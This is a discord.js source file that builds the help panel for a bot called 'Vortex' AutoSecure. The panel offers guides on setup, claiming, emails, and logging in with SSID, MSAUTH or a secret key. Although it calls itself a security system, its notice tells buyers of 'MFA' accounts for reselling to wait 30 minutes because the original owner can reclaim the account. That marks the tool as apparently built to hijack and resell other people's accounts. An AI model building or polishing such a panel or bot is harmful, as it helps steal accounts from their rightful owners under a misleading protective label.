const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder
} = require("discord.js");

const BANNER_GIF =
  "https://cdn.discordapp.com/attachments/1465727971829485865/1465729852412924014/IMG_0219.png?ex=698f42cc&is=698df14c&hm=d99767b91ca0c7f738d414409754cfdeb69aceb822d8039e47ac6124ecd0b498";

function createhelppanel(guild) {
  const embed = new EmbedBuilder()
    .setTitle("⚡ **__Vortex__** — Help & Information")
    .setDescription(
      "## ⚡ Welcome to AutoSecure\n" +
      "AutoSecure is a **powerful security & automation system** designed to protect accounts, bots, and users.\n\n" +

      "## 🔎 **__What can you find here__**?\n" +
      "• Full bot setup guides\n" +
      "• Secure login methods\n" +
      "• Email & claiming systems\n" +
      "• Configuration & advanced options\n\n" +

      "## ❓ **__Need help__**?\n" +
      "If something isn’t clear or you’re stuck, **open a support ticket** and our staff will assist you.\n\n" +

      "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
      "## ⚠️ **__Important Note__**\n" +
      "• If you are **buying MFA for reselling**, you must **hold the account for at least 30 minutes before releasing it**.\n" +
      "• The original owner **can pull back the account within 30 minutes**.\n" +
      "• During reselling, **accounts may get locked** — **we are NOT responsible for any account locks**.\n" +
      "• **Especially:** If you're buying from a user who is using **Pengu AutoSecure**, **account lock is highly likely / confirmed**.\n" +
      "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    .setColor(0x9b7cff)
    .setThumbnail(
      "https://cdn.discordapp.com/attachments/1465727971829485865/1465729852412924014/IMG_0219.png?ex=698f42cc&is=698df14c&hm=d99767b91ca0c7f738d414409754cfdeb69aceb822d8039e47ac6124ecd0b498"
    )
    .setImage(BANNER_GIF)
    .setFooter({
      text: "⚡ • Vortex Guide Panel"
    });

  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("starting_bot")
      .setLabel("Autosecure Full Setup Guide")
      .setEmoji("⚙️")
      .setStyle(ButtonStyle.Primary),

    new ButtonBuilder()
      .setCustomId("securing")
      .setLabel("Securing")
      .setEmoji("⚙️")
      .setStyle(ButtonStyle.Success),

    new ButtonBuilder()
      .setCustomId("responses")
      .setLabel("Bot responses")
      .setEmoji("⚙️")
      .setStyle(ButtonStyle.Secondary),

    new ButtonBuilder()
      .setCustomId("login_msauth")
      .setLabel("Login with MSAUTH")
      .setEmoji("🧩")
      .setStyle(ButtonStyle.Primary)
  );

  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("emails")
      .setLabel("Emails")
      .setEmoji("📧")
      .setStyle(ButtonStyle.Secondary),

    new ButtonBuilder()
      .setCustomId("seeclaiming2")
      .setLabel("Claiming & users")
      .setEmoji("📁")
      .setStyle(ButtonStyle.Primary),

    new ButtonBuilder()
      .setCustomId("ssidhelp")
      .setLabel("Login with SSID")
      .setEmoji("🔒")
      .setStyle(ButtonStyle.Success),

    new ButtonBuilder()
      .setCustomId("secret_key")
      .setLabel("Login with Secret key")
      .setEmoji("🗝️")
      .setStyle(ButtonStyle.Danger)
  );

  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("configbutton")
      .setLabel("Config")
      .setEmoji("⚙️")
      .setStyle(ButtonStyle.Secondary),

    new ButtonBuilder()
      .setCustomId("multiplayerhelp")
      .setLabel("Troubleshooting")
      .setEmoji("❓")
      .setStyle(ButtonStyle.Danger)
  );

  return {
    embeds: [embed],
    components: [row1, row2, row3]
  };
}

module.exports = { createhelppanel };